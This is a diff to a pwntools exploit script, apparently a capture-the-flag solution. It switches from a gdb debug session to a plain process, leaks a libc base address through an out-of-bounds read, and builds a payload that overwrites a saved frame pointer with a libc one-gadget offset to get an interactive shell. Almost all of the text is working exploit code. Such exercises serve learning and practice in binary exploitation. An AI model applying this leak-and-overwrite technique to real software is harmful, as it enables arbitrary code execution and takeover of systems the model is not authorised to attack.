@@ -52,30 +52,28 @@ context.terminal = ['tmux', 'split-w', '-h']
 
 gdbscript = '''
 gef
-b *0x555555554d00
-b new
-b show
-b delete
+# b *0x555555554d00
+b *0x555555554d11
+# b new
+# b show
+# b delete
 '''
-io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
+# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
+io = process(binpath)
 
 
 set_n(65535)
 
 data = show(0x1c)
 addr_libc = u64(data.ljust(8, b'\x00')) - 0x199e10
-# print(hexdump(data))
 print('addr_libc = 0x{:x}'.format(addr_libc))
-data = show(0xd)
-addr_stack = u64(data.ljust(8, b'\x00')) - 0x20cd0
-# print(hexdump(data))
-print('addr_stack = 0x{:x}'.format(addr_stack))
 
-# heap address to use ase size
-new(0, 0x8, b'A')
-# null out following words
-new(1, 0x8, b'A')
-delete(1)
+# overwrite old rbp at index 6
+payload = b''
+payload += p64(0xdeadbeef)
+payload += p64(addr_libc + 0x4f322)
+new(6, len(payload), payload)
 
+io.sendline(b'a')
 
 io.interactive()
